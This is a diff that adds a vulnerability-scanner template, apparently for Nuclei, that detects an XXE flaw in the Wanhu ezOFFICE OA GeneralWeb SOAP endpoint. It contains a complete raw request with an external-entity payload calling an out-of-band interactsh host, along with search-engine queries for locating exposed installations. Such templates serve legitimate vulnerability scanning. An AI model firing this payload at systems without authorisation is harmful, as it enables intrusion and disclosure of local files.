@@ -1,0 +1,47 @@
+id: wanhu-ezoffice-GeneralWeb-xxe
+info:
+  name: 万户 ezoffice 系统接口 GeneralWeb - xxe
+  author: leadlife
+  severity: critical
+  description: 万户OA系统接口GeneralWeb存在XXE漏洞，允许攻击者利用XML解析器处理外部实体，从而访问本地文件或进行其他恶意操作，可能导致敏感信息泄露和系统被攻击。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3GeneralWeb%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,xxe,oa,ezoffice,oob
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: 
+        Content-Length: 457
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
+          <soapenv:Body>
+            <gen:OAManager>
+              <gen:input>
+                &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+                &lt;!DOCTYPE root [
+                &lt;!ENTITY x SYSTEM "http://{{interactsh-url}}"&gt;]&gt;
+                &lt;root&gt;&amp;x;&lt;/root&gt;
+              </gen:input>
+            </gen:OAManager>
+          </soapenv:Body>
+        </soapenv:Envelope>
+        
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
